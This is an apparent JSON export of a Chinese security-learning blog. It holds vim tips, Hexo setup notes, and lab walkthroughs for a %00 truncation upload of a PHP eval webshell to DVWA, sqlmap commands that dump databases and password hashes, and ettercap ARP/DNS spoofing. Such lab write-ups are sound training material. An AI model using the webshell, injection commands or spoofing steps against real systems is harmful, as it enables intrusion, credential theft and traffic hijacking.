利用了Linux/Unix的作业机制，将vim进程放到后台/前台执行，便于使用shell环境。• vim -o *.py 打开当前目录下全部.py文件• :qa 退出全部窗口。• vnew 垂直分屏。• ctrl-w r 切换缓冲区。• :r filename 将文件读入到当前光标位置。• windo diffthis/diffoff 对比当前打开的两个缓冲区。• :e! 重新打开缓冲区。• \\# / \\* 向前/向后查找当前光标所在单词。• :%s/foo/bar/gc 查找并替换。• :1?xxxx / G?xxxx 从文件末尾开始查找。• shift-k 查找光标所在命令或函数的man帮助。• J 合并行。• gj / gk 对于换行的段落的行移动。• shift + v 以行为单位进入可视化模式• ctrl + v 以块为单位进入可视化模式• shift + i 在以块为单位的基础上在选择的多行上插入相同的内容","categories":[{"name":"linux","slug":"linux","permalink":"http://airs-sec.com/categories/linux/"}],"tags":[],"keywords":[{"name":"linux","slug":"linux","permalink":"http://airs-sec.com/categories/linux/"}]},{"title":"更换了电脑如何部署git和hexo","slug":"更换了电脑如何部署git和hexo","date":"2016-08-31T07:14:56.000Z","updated":"2016-09-01T15:26:46.831Z","comments":true,"path":"2016/08/31/更换了电脑如何部署git和hexo/","link":"","permalink":"http://airs-sec.com/2016/08/31/更换了电脑如何部署git和hexo/","excerpt":"1.下载git git下载 2.下载node.js node.js下载 3.生成密钥 ssh-keygen -t rsa -C “test@qq.com“ 12345678910111213141516171819202122$ ssh-keygen -t rsa -C \"test@qq.com\"Generating public/private rsa key pair.Enter file in which to save the key (/c/Users/xcr/.ssh/id_rsa):Created directory '/c/Users/xcr/.ssh'.Enter passphrase (empty for no passphrase):Enter same passphrase again:Your identification has been saved in /c/Users/xcr/.ssh/id_rsa.Your public key has been saved in /c/Users/xcr/.ssh/id_rsa.pub.The key fingerprint is:．．．The key's randomart image is:+---[RSA 2048]----+| || . .|| o . .o|| o o . ..o.|| . S o .o+ || * * o +o || @ + =...o|| = =+Eo+o+o|| oo=**.++o|+----[SHA256]-----+","text":"1.下载git git下载 2.下载node.js node.js下载 3.生成密钥 ssh-keygen -t rsa -C “test@qq.com“ 12345678910111213141516171819202122$ ssh-keygen -t rsa -C \"test@qq.com\"Generating public/private rsa key pair.Enter file in which to save the key (/c/Users/xcr/.ssh/id_rsa):Created directory '/c/Users/xcr/.ssh'.Enter passphrase (empty for no passphrase):Enter same passphrase again:Your identification has been saved in /c/Users/xcr/.ssh/id_rsa.Your public key has been saved in /c/Users/xcr/.ssh/id_rsa.pub.The key fingerprint is:．．．The key's randomart image is:+---[RSA 2048]----+| || . .|| o . .o|| o o . ..o.|| . S o .o+ || * * o +o || @ + =...o|| = =+Eo+o+o|| oo=**.++o|+----[SHA256]-----+ 4.拷贝本地的公钥文件中的内容，上传至github.com 5.打开git bash,安装hexo $ npm install hexo-cli -g 6.将原来的文件拷贝到新电脑中，必须拷贝的文件。 _config.yml，theme/，source/，scaffolds/，package.json，.gitignore， node_modules也可以加上 5.打开git bash，输入npm install即可 可能提示如下： 按其配置即可：12git config --global user.email \"you@example.com\"git config --global user.name \"Your Name\" 6.本地预览 hexo s 7.远程预览生成网站 hexo d -g 输入域名即可 8.完成 参考： 使用hexo，如果换了电脑怎么更新博客","categories":[{"name":"学习","slug":"学习","permalink":"http://airs-sec.com/categories/学习/"}],"tags":[],"keywords":[{"name":"学习","slug":"学习","permalink":"http://airs-sec.com/categories/学习/"}]},{"title":"burp suite 00截断拿webshell","slug":"burp-suite-00截断拿webshell","date":"2016-08-25T14:11:29.000Z","updated":"2016-09-01T15:26:46.817Z","comments":true,"path":"2016/08/25/burp-suite-00截断拿webshell/","link":"","permalink":"http://airs-sec.com/2016/08/25/burp-suite-00截断拿webshell/","excerpt":"burp suite 00 截断拿webshell 在我们拿到网站数据库后，通常会去找网站的后台进行登陆，通过上传小马去获得web服务器的shell。 在上传小马的时候，我们上传的小马文件可能会被网站自动改成其他的名字，通常会将上传的文件的后缀修改为图片格式。 这个时候我们可以尝试抓取数据包，将小马的文件名改成xx.asp%00.jpg的格式进行00截断上传，从而拿到webshell。 为什么添加%00就可以上传了呢？ 因为服务器在解析文件名的那个变量的时候，遇到二进制的00时，认为该变量已经结束了，从而00后面的字符也就被忽略掉了。","text":"burp suite 00 截断拿webshell 在我们拿到网站数据库后，通常会去找网站的后台进行登陆，通过上传小马去获得web服务器的shell。 在上传小马的时候，我们上传的小马文件可能会被网站自动改成其他的名字，通常会将上传的文件的后缀修改为图片格式。 这个时候我们可以尝试抓取数据包，将小马的文件名改成xx.asp%00.jpg的格式进行00截断上传，从而拿到webshell。 为什么添加%00就可以上传了呢？ 因为服务器在解析文件名的那个变量的时候，遇到二进制的00时，认为该变量已经结束了，从而00后面的字符也就被忽略掉了。 测试站点：dvwa平台 1.准备一句话木马 1&lt;?php @eval($_POST['cracer']);?&gt; 2.将dvwa测试平台的等级设置为中等 3.使用burp suite开启代理，浏览器设置本地127.0.0.1：8080代理 4.开启burp的截包功能 5.浏览器上传文件，burp获取到数据包 6.发送数据到repeater 7.修改上传文件的后缀名，在jpg前面加一个空格 8.选择hex，把空格的%20改成%00 9.改完后的效果 10.回到proxy，点击forward 11.小马上传成功 12.接下来，只需要通过菜刀通过小马连接到服务器，上传大马提取webshell即可。","categories":[{"name":"渗透","slug":"渗透","permalink":"http://airs-sec.com/categories/渗透/"}],"tags":[{"name":"burp suite","slug":"burp-suite","permalink":"http://airs-sec.com/tags/burp-suite/"}],"keywords":[{"name":"渗透","slug":"渗透","permalink":"http://airs-sec.com/categories/渗透/"}]},{"title":"sqlmap基本知识和测试","slug":"sqlmap基本知识和测试","date":"2016-08-06T12:42:26.000Z","updated":"2016-09-01T15:26:46.824Z","comments":true,"path":"2016/08/06/sqlmap基本知识和测试/","link":"","permalink":"http://airs-sec.com/2016/08/06/sqlmap基本知识和测试/","excerpt":"sqlmap基本知识记录和测试 sqlmap可以干吗？ 1.判断参数是否可注入2.判断可以用什么sql注入模式进行注入3.识别出哪种数据库4.根据用户选择，读取哪些数据 五种注入模式 1.bool盲注2.基于时间的盲注3.基于报错注入4.联合查询注入5.堆查询注入","text":"sqlmap基本知识记录和测试 sqlmap可以干吗？ 1.判断参数是否可注入2.判断可以用什么sql注入模式进行注入3.识别出哪种数据库4.根据用户选择，读取哪些数据 五种注入模式 1.bool盲注2.基于时间的盲注3.基于报错注入4.联合查询注入5.堆查询注入 常用指令 列出数据库 1[root@Hacker~]# Sqlmap -u \"http://.com/xx.php?id=1028\" --dbs 1[root@Hacker~]# Sqlmap -u \"http:xx.com/xx.php?id=1028\" --dbs --users 从文本中获取个目标进行扫描，参数：-m 1sqlmap -m \"test_url.txt\" --dbs http数据，参数：–data此参数是把数据以POST方式提交，sqlmap会像检测GET参数一样检测POST参数 1# sqlmap -u \"http:xx.com/xx.php\" --data=\"id=1\" --dbs --users 列出当前的用户：参数：–current-user，和–users差不多 1[root@Hacker~]# Sqlmap -u \"http:xx.com/xx.php?id=1\" --dbs --current-user 列出当前的用户和当前正在使用的数据库 1[root@Hacker~]# Sqlmap -u \"http:xx.com/xx.php?id=1\" --dbs --current-user --current-db 列出当前的用户和当前使用的数据库并判断当前用户是否是dba 1[root@Hacker~]# Sqlmap -u \"http:xx.com/xx.php?id=1\" --dbs --current-user --current-db --is-dba 列出当前数据库下的表 1[root@Hacker~]# Sqlmap -u \"http:xx.com/xx.php?id=1\" -D 数据库名 --tables 列出当前数据库下当前表下的字段数 1[root@Hacker~]# Sqlmap -u http:xx.com/xx.php?id=1\" -D 数据库名 -T jk_user --columns 直接把字段打印出来 1[root@Hacker~]# Sqlmap -u \"http:xx.com/xx.php?id=1\" -D 数据库名 -T jk_user -C lb,mm,yhm --dump 1[root@Hacker~]# Sqlmap -u \"http:xx.com/xx.php?id=1\" -D 数据库名 -T jk_login -C sf,yhm --dump 通过cookie进行sql注入环境为dvwa装在win7上，另一个系统为kail2.0_64位 dvwa为low级别 1./sqlmap.py -u“http://10.10.10.2/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit” –cookie=”PHPSESSID=57p5g7f32b3ffv8l45qppudqn3;security=low” -b –current-db –current-user 1、–cookie : 设置我们的cookie值“将DVWA安全等级从high设置为low” 2、-u : 指定目标URL 3、-b : 获取DBMS banner 4、–current-db : 获取当前数据库 5、–current-user:获取当前用户 1# sqlmap -u \"http://192.168.100.225/dvwa-c/vulnerabilities/sqli/?id=1&amp;Submit=%C8%B7%B6%A8#\" --cookie=\"security=low; PHPSESSID=tmqlt61pk349bsrkl6n9kifuk3\" -b --current-db --current-user 1# sqlmap -u \"http://192.168.100.225/dvwa-c/vulnerabilities/sqli/?id=1&amp;Submit=%C8%B7%B6%A8#\" --cookie=\"security=low; PHPSESSID=tmqlt61pk349bsrkl6n9kifuk3\" --users --password 1# sqlmap -u \"http://192.168.100.225/dvwa-c/vulnerabilities/sqli/?id=1&amp;Submit=%C8%B7%B6%A8#\" --cookie=\"security=low; PHPSESSID=tmqlt61pk349bsrkl6n9kifuk3\" -D dvwa --tables 1# sqlmap -u \"http://192.168.100.225/dvwa-c/vulnerabilities/sqli/?id=1&amp;Submit=%C8%B7%B6%A8#\" --cookie=\"security=low; PHPSESSID=tmqlt61pk349bsrkl6n9kifuk3\" -D dvwa -T users --columns 1# sqlmap -u \"http://192.168.100.225/dvwa-c/vulnerabilities/sqli/?id=1&amp;Submit=%C8%B7%B6%A8#\" --cookie=\"security=low; PHPSESSID=tmqlt61pk349bsrkl6n9kifuk3\" -D dvwa -T users -C user,password --dump 破解hash值，获取密码","categories":[{"name":"渗透","slug":"渗透","permalink":"http://airs-sec.com/categories/渗透/"}],"tags":[{"name":"sqlmap","slug":"sqlmap","permalink":"http://airs-sec.com/tags/sqlmap/"}],"keywords":[{"name":"渗透","slug":"渗透","permalink":"http://airs-sec.com/categories/渗透/"}]},{"title":"局域网攻击arp欺骗","slug":"局域网攻击arp欺欺骗","date":"2016-08-06T09:33:07.000Z","updated":"2016-09-01T15:26:46.830Z","comments":true,"path":"2016/08/06/局域网攻击arp欺欺骗/","link":"","permalink":"http://airs-sec.com/2016/08/06/局域网攻击arp欺欺骗/","excerpt":"局域网攻击arp欺骗利用的原理主要是通过劫持DNS达到欺骗主机的目的，将其他主机访问的所有网站都指向这台攻击主机指定的ip或域名（这个过程是攻击主机作为一台dns服务器进行dns解析，将目的ip解析成攻击主机定义的域名或ip） 环境kail2.0：攻击主机winxp：客户主机（被攻击主机） 拓扑图","text":"局域网攻击arp欺骗利用的原理主要是通过劫持DNS达到欺骗主机的目的，将其他主机访问的所有网站都指向这台攻击主机指定的ip或域名（这个过程是攻击主机作为一台dns服务器进行dns解析，将目的ip解析成攻击主机定义的域名或ip） 环境kail2.0：攻击主机winxp：客户主机（被攻击主机） 拓扑图 过程 配置网络 xp： kail2.0： 1.修改interfaces文件 1234567891011121314Vim /etc/network/interfaces# This file describes the network interfaces available on your system# and how to activate them. For more information, see interfaces(5).source /etc/network/interfaces.d/*# The loopback network interfaceauto loiface lo inet loopbackiface eth0 inet staticaddress 192.168.100.245netmask 255.255.255.0gateway 192.168.100.254 2.修改dns解析文件12nameserver 202.101.224.68nameserver 8.8.8.8 3重启网络1ifup eth0 xp和kail需在同一个网段内 开始攻击 启用ettercap 1ettercap -G 建立扫描 扫描主机 主机列表 指定攻击的主机和网关 启用arp欺骗 选择扫描远程连接 开始sniffing 搜索etter.dns文件，添加相应的A记录，这一步就是一个欺骗的目的，将所有的访问指向192.168.100.254 选择DNS欺骗插件，开始dns欺骗 双击dns_spoof模块，设置完毕 测试","categories":[{"name":"渗透","slug":"渗透","permalink":"http://airs-sec.com/categories/渗透/"}],"tags":[],"keywords":[{"name":"渗透","slug":"渗透","permalink":"http://airs-sec.com/categories/渗透/"}]}]}